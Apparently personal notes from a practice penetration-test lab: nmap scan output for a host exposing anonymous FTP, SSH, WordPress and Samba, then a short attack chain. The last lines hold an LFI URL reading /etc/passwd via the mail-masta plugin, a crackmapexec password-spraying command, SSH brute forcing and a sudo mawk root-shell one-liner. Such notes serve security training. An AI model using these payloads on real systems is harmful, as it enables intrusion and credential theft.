PORT    STATE SERVICE     REASON         VERSION
21/tcp  open  ftp         syn-ack ttl 63 vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0         3557581 Nov 25  2021 2d5ef5a0f0c9579458c9
| -rw-r--r--    1 0        0         1258508 Nov 25  2021 4835e976619690ae006e
| -rw-r--r--    1 0        0         1617905 Nov 25  2021 4e8cce46d6abec9a9d9a
| -rw-r--r--    1 0        0          438095 Nov 25  2021 77cfe070405f6ca327a5
|_-rw-r--r--    1 0        0          841392 Nov 25  2021 c5237630ef40e2585d35
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.49.102
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0e:84:80:bd:8f:b6:51:7d:c1:87:db:8c:f4:f3:15:9e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC9nHUN7lQ1VshjtRmnS2YHv5LnvtGDgMTUftd0YUWr2LRwigorhGPAiPTq/Tlw6P8XzkoZS/8bhK76OcMWMKm3zo7fisFQIFy3sH35mIo46aWvACqoKmF2mlXimNgQVtM6g2aWoxJ+Qlpci8TwcAvrO1em8vYgOa5oE//o7LIdpItoUhm7R1iNLwl9lOQpbJfUXIhAQZAzrURlfWm11WpmEP7ILtsjhYS4SQOwwll/0sbxp+i4YXyu34oTCn6OA0TZgxBIc47S7gz22qpT74rdbLnUzZm00wcZxGobSpr5qNQC+pfNtvtqt8d91anNkQAVZ1C8U0h5DaIRQmpEqMwJvsEZh/yMAiFEpn9s7DvXLT1aK8D5NS8VtDCK5O420ViLeGBWXIs6avIYxQisuQYA3Cip0hWJ79ai10pb1lER+43nMesriJQkIkdauEaH7IhNk42ub2TZGWxn874n4xKkdzPbLZOTxzUmpRotpGBHwKdchUcRZJOMafrFJ01YDLc=
|   256 8c:98:44:30:1c:37:53:84:32:22:eb:e1:9c:06:68:06 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCtZT7ZFuLJw/DZPlGRJkofY7SC8CTXL3DMmQjdOKGqJLtghqbWZIjVKmraQt8LCm7JHVCSUDrxP70S2MrxZfBw=
|   256 1b:db:c7:c9:36:54:b8:cf:ff:1a:2f:9a:91:b1:56:e4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPc0QcPocKaY+OjfHFNGX4JlKQ2KHKmGD76UuPRWrXvt
80/tcp  open  http        syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS
|_http-generator: WordPress 6.0.2
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-favicon: Unknown favicon MD5: 38BC6973F189E1FBB976EB4864D93528
|_http-title: The Stationery Warehouse &#8211; Just another WordPress site
|_http-server-header: Apache/2.4.41 (Ubuntu)
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4.6.2
445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4.6.2
OS fingerprint not ideal because: maxTimingRatio (2.400000e+00) is greater than 1.4
Aggressive OS guesses: Linux 2.6.32 (97%), Linux 4.0 (95%), Linux 2.6.39 (94%), Linux 3.10 - 3.16 (94%), Linux 3.10 (92%), Linux 2.6.32 or 3.10 (92%), Linux 3.5 (92%), Linux 4.2 (92%), Linux 4.4 (92%), Synology DiskStation Manager 5.1 (92%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94SVN%E=4%D=2/28%OT=21%CT=1%CU=%PV=Y%DS=2%DC=T%G=N%TM=65DEC3A9%P=x86_64-pc-linux-gnu)
SEQ(TI=Z%TS=A)
SEQ(SP=102%GCD=1%ISR=107%TI=Z%TS=A)
ECN(R=N)
ECN(R=Y%DF=Y%TG=40%W=FAF0%O=M551NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
T5(R=N)
T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=N)
T7(R=N)
U1(R=N)
IE(R=N)

Uptime guess: 14.919 days (since Tue Feb 13 12:51:02 2024)
Network Distance: 2 hops
IP ID Sequence Generation: All zeros
Service Info: Host: the; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-02-28T05:24:34
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 11462/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 11166/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 62839/udp): CLEAN (Failed to receive data)
|   Check 4 (port 62621/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 0s
| nbstat: NetBIOS name: OSCP, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   OSCP<00>             Flags: <unique><active>
|   OSCP<03>             Flags: <unique><active>
|   OSCP<20>             Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00

TRACEROUTE (using port 995/tcp)
HOP RTT       ADDRESS
1   454.33 ms 192.168.49.1
2   454.36 ms 192.168.102.112

LFI in mail masta plugin
http://192.168.102.112/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
got username
passwords in pdf
crackmapexec smb 192.168.102.112 -u user112.txt -p password112.txt --shares --continue-on-success
 bruteforce ssh
 got sarah for ssh
 sudo -l 
 mawk
 sudo mawk 'BEGIN {system("/bin/sh")}'
 gtfobins got root